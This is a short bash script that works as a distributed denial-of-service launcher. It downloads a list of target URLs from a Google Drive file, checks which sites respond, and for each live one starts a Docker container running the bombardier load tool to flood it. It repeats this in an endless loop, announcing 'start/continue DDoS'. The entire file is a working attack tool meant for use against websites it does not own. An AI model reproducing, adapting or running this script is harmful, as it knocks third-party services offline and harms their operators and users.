#!/bin/bash
source "$(dirname $0)/config"

if [ ! -x "$(command -v docker)" ]; then
	echo "Docker is not installed"
	exit 1
fi
if ! docker info > /dev/null 2>&1; then
  echo "This script uses docker, and it isn't running or the user has no permissions to manage Docker"
  echo "Please start docker or change user and try again!"
  exit 1
fi

TARGETS="https://drive.google.com/uc?id=$(echo $TARGETS | sed -n "s/^.*d\/\(.*\)\/view.*$/\1/p")"

while true; do
	echo "Updating targets from URL"
	until SOURCE_URLS=$(wget -qO- "$TARGETS"); do
		echo "Failed. Retrying"
		sleep 10
	done
	echo "Processing targets"
	SOURCE_URLS=$(echo "$SOURCE_URLS" | sort | uniq | shuf)
	for url in $SOURCE_URLS; do
		printf "* $url - "
		response=$(curl -sLo /dev/null -w ''%{http_code}'' -m "$TIMEOUT" "$url")
		container="${PREFIX}$(echo "$url" | awk -F/ '{print $3}')"
		if [ "$response" -eq 200 ]; then
			printf "UP, start/continue DDoS\n"
			docker run --name "$container" --rm -d alpine/bombardier -c "$CONNECTIONS" -d "${DURATION}s" "$url" >/dev/null 2>&1
		else
			printf "DOWN\n"
		fi
	done
done
